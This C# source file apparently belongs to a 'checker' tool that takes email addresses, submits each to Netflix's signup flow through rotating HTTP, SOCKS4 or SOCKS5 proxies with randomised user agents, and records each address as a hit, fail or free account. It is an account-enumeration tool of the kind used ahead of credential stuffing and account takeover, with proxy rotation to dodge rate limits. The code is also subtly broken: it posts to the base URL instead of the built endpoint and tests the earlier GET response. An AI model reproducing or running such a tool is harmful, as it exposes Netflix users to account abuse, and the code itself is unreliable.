using System;
using Leaf.xNet;
using CheckerSimplefied;
using System.Drawing;
using System.Text.RegularExpressions;

namespace SC___Mail_Validator
{
    class NetflixVM
    {
        public static void postRequest(string username)
        {
            Utilities.name = "Netflix";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        string url = "https://www.netflix.com/";
                        var response = request.Raw(HttpMethod.GET, url).ToString();
                        string esn = response.Substring("{\"esn\":\"", "\"");
                        string uiVersion = response.Substring("Netflix.uiVersion\":\"", "\"");
                        string authurl = Regex.Unescape(response.Substring("\"authURL\":\"", "\""));

                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/json");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "X-Netflix.Client.Request.Name: ui/xhrUnclassified");
                        string urlPost = "https://www.netflix.com/api/shakti/" + uiVersion + "/flowendpoint?flow=signupSimplicity&mode=welcome&landingURL=%2Fus-en%2F&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn=" + esn + "&languages=en-US&netflixClientPlatform=browser&supportCategory=innovation";
                        var responsePost = request.Raw(HttpMethod.POST, url, (HttpContent)new StringContent("{\"flow\":\"signupSimplicity\",\"mode\":\"welcome\",\"authURL\":\"" + authurl + "\",\"action\":\"saveAction\",\"fields\":{\"email\":{\"value\":\"" + username + "\"}}}")).ToString();

                        if (response.Contains("mode\":\"switchFlow\""))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("registrationWithContext"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                        if (response.Contains("mode\":\"passwordOnly\"") || response.Contains("FORMER_MEMBER"))
                        {
                            Utilities.saveFree(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
